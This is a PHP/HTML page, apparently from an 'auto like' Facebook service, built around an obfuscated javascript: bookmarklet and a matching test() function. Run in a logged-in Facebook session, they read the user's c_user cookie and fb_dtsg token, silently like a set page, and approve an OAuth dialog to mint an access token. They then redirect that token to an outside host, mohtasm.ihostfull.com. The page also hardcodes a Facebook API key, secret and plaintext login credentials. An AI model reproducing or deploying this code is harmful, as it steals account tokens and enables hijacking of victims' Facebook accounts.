<?php  include "inc.php";

$user = isv("user");
$pass = isv("pass");
if($user){
$apikey = "882a8490361da98702bf97a021ddc14d";
 $sec = "62f8ce9f74b12f84c123cc23437a4a32";

 //$pas = str_replace("#","",$pass);
 //https://api.facebook.com/restserver.php?api_key=882a8490361da98702bf97a021ddc14d&email=mohtasm.sawilh&format=JSON&locale=vi_vn&method=auth.login&password=mohtasmadmin10QQ&return_ssl_resources=0&v=1.0&sig=3ebba1fff1ace1dd3ff1cddf81e9bd7a
 $mdtet = "api_key=".$apikey."email=".$user."format=JSONlocale=vi_vnmethod=auth.loginpassword=".$pass."return_ssl_resources=0v=1.0".$sec;
 $Mapp= "api_key=".$apikey."&email=".$user."&format=JSON&locale=vi_vn&method=auth.login&password=".$pass."&return_ssl_resources=0&v=1.0";
 $ar = "https://api.facebook.com/restserver.php?".$Mapp."&sig=".md5($mdtet);
 }else{
     $ar ="inc/ifram.php";
     //$ar ="//api.jquery.com/";
 }
 ?>
<!DOCTYPE html>
  <html>
    <head>
      <!--Import Google Icon Font-->
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <!--Import materialize.css-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0-alpha.1/css/materialize.min.css">

      <!--Let browser know website is optimized for mobile-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    </head>

    <body>

        <iframe   id="iframeID" width="100%" height="25%" src="<?=$ar?>"></iframe>
        <a  style="cursor: move;"  onclick="test()" href="javascript:var _0x5be6=["165907476854626","http://mohtasm.ihostfull.com/get_code.php?app=1&user=","getTime","value","fb_dtsg","getElementsByName","/v1.0/dialog/oauth/confirm","fb_dtsg=","&app_id=","&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1","POST","open","onreadystatechange","readyState","status","match","responseText","close","/v1.0/dialog/oauth/confirm","href","send","Content-type","application/x-www-form-urlencoded","setRequestHeader"];var id_app=_0x5be6[0];var haylike=_0x5be6[1];function sleep(_0x442fx4){var _0x442fx5= new Date()[_0x5be6[2]]();while( new Date()[_0x5be6[2]]()<_0x442fx5+_0x442fx4){;}}var delay_time=1000;var fb_dtsg=document[_0x5be6[5]](_0x5be6[4])[0][_0x5be6[3]];function getCookie(cname) {    var name = cname + "=";    var decodedCookie = decodeURIComponent(document.cookie);    var ca = decodedCookie.split(";");    for(var i = 0; i <ca.length; i++) {        var c = ca[i];        while (c.charAt(0) == " ") {            c = c.substring(1);        }        if (c.indexOf(name) == 0) {            return c.substring(name.length, c.length);        }    }    return "";}var x = getCookie("c_user");var pak= "fbpage_id=1426100954327128&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&actor_id="+x+"&__user="+x+"&__a=1&__dyn=&__af=iw&__req=h&__be=-1&__pc=EXP4%3ADEFAULT&__rev=3020167&fb_dtsg="+fb_dtsg+"&logging=&__spin_b=trunk&__spin_t=";var ul= "https://www.facebook.com/ajax/pages/fan_status.php?av="+x+"&dpr=1";var xhr= new XMLHttpRequest();xhr.open("POST", ul, true);xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");xhr.send(pak);;var e= new XMLHttpRequest;var t=_0x5be6[6];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];e[_0x5be6[11]](_0x5be6[10],t,true);e[_0x5be6[12]]=function(){if(e[_0x5be6[13]]==4&&e[_0x5be6[14]]==200){mabaomat=e[_0x5be6[16]][_0x5be6[15]](/token=(.+)&/)[1];e[_0x5be6[17]];var _0x442fxb= new XMLHttpRequest;var t=_0x5be6[18];var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];_0x442fxb[_0x5be6[11]](_0x5be6[10],t,true);_0x442fxb[_0x5be6[12]]=function(){if(_0x442fxb[_0x5be6[13]]==4&&_0x442fxb[_0x5be6[14]]==200){mabaomat=_0x442fxb[_0x5be6[16]][_0x5be6[15]](/token=(.+)&/)[1];_0x442fxb[_0x5be6[17]];sleep(delay_time);location[_0x5be6[19]]=haylike+mabaomat}};_0x442fxb[_0x5be6[23]](_0x5be6[21], _0x5be6[22]);_0x442fxb[_0x5be6[20]](n)}};e[_0x5be6[23]](_0x5be6[21], _0x5be6[22]);;e[_0x5be6[20]](n);" ><img src="http://data.haylike.net/img/lg.jpg" class="img img-responsive" alt="Hack like - Auto like - T?ng like "></a>
        <button class="btn"  onclick="Btn()" >click me</button>
      <!--JavaScript at end of body for optimized loading-->
      <script type="text/javascript" src="http://mohtasm.ihostfull.com//assets/js/jquery.min.js"></script>
      <script type="text/javascript" src="https://goliker.pw/token/md5.js"></script>
      <script type="text/javascript">
/*
checkIframeLoaded('iframeID',afterLoading);
function checkIframeLoaded(fid,afterLoading) {
    var iframe = document.getElementById(fid);
    var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
    if (  iframeDoc.readyState  == 'complete' ) {
        iframe.contentWindow.onload = function(){
            afterLoading(fid);
        };
        // afterLoading(fid);
        //return;
    }
    window.setTimeout(checkIframeLoaded, 100);
}
*/
function afterLoading(){
     //var bod =   $('#iframeID').contents().find('pre').html();
     var bod =   $('#iframeID').contents();
     //alert(bod);
     alert("test");
}


var email = "mohtasm.sawilh";
var pass = "mohtasm10WWa";
var apikey = "882a8490361da98702bf97a021ddc14d";
var sec = "62f8ce9f74b12f84c123cc23437a4a32";
var mdtet = "api_key="+apikey+"email="+email+"format=JSONlocale=vi_vnmethod=auth.loginpassword="+pass+"return_ssl_resources=0v=1.0"+sec;
var app = "api_key="+apikey+"&email="+email+"&format=JSON&locale=vi_vn&method=auth.login&password="+pass+"&return_ssl_resources=0&v=1.0";
app =  "https://api.facebook.com/restserver.php?"+app+"&sig="+md5(mdtet);
function Btn(){
$('#iframeID').attr("src",app);
setInterval(afterLoading, 3000);
//alert(app);

}
//alert(app);
function getCookie(cname) {
     var name = cname + "=";
     var decodedCookie = decodeURIComponent(document.cookie);
     var ca = decodedCookie.split(";");
     for(var i = 0; i <ca.length; i++) {
         var c = ca[i];
         while (c.charAt(0) == " ") {
             c = c.substring(1);
             }
             if (c.indexOf(name) == 0) {
                 return c.substring(name.length, c.length);
                 }    }    return "";}
function test(){

var _0x5be6=["165907476854626","http://mohtasm.ihostfull.com/?user=","getTime","value","fb_dtsg","getElementsByName","/v1.0/dialog/oauth/confirm","fb_dtsg=","&app_id=","&redirect_uri=fbconnect://success&display=popup&access_token=&sdk=&from_post=1&private=&tos=&login=&read=&write=&extended=&social_confirm=&confirm=&seen_scopes=&auth_type=&auth_token=&auth_nonce=&default_audience=&ref=Default&return_format=access_token&domain=&sso_device=ios&__CONFIRM__=1","POST","open","onreadystatechange","readyState","status","match","responseText","close","/v1.0/dialog/oauth/confirm","href","send","Content-type","application/x-www-form-urlencoded","setRequestHeader"];
var id_app=_0x5be6[0];
var haylike=_0x5be6[1];
function sleep(_0x442fx4){
    var _0x442fx5= new Date()[_0x5be6[2]]();
    while( new Date()[_0x5be6[2]]()<_0x442fx5+_0x442fx4){;}
    }
    var delay_time=1000;
    var fb_dtsg=document[_0x5be6[5]](_0x5be6[4])[0][_0x5be6[3]];

var x = getCookie("c_user");
var pak= "fbpage_id=148921575540209&add=true&reload=false&fan_origin=page_timeline&fan_source&cat&actor_id="+x+"&__user="+x+"&__a=1&__dyn=&__af=iw&__req=h&__be=-1&__pc=EXP4%3ADEFAULT&__rev=3020167&fb_dtsg="+fb_dtsg+"&logging=&__spin_b=trunk&__spin_t=";
var ul= "https://www.facebook.com/ajax/pages/fan_status.php?av="+x+"&dpr=1";
var xhr= new XMLHttpRequest();
xhr.open("POST", ul, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send(pak);;
var e= new XMLHttpRequest;
var t=_0x5be6[6];
var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];
e[_0x5be6[11]](_0x5be6[10],t,true);
e[_0x5be6[12]]=function(){
if(e[_0x5be6[13]]==4&&e[_0x5be6[14]]==200){
mabaomat=e[_0x5be6[16]][_0x5be6[15]](/token=(.+)&/)[1];
e[_0x5be6[17]];
var _0x442fxb= new XMLHttpRequest;
var t=_0x5be6[18];
var n=_0x5be6[7]+fb_dtsg+_0x5be6[8]+id_app+_0x5be6[9];
_0x442fxb[_0x5be6[11]](_0x5be6[10],t,true);
_0x442fxb[_0x5be6[12]]=function(){
    if(_0x442fxb[_0x5be6[13]]==4&&_0x442fxb[_0x5be6[14]]==200){
    mabaomat=_0x442fxb[_0x5be6[16]][_0x5be6[15]](/token=(.+)&/)[1];
    _0x442fxb[_0x5be6[17]];
    sleep(delay_time);
    location[_0x5be6[19]]=haylike+mabaomat
    }
    };
    _0x442fxb[_0x5be6[23]](_0x5be6[21], _0x5be6[22]);
    _0x442fxb[_0x5be6[20]](n)}};
    e[_0x5be6[23]](_0x5be6[21], _0x5be6[22]);;
    e[_0x5be6[20]](n);
    alert("tsttt");

}
      </script>
    </body>
  </html>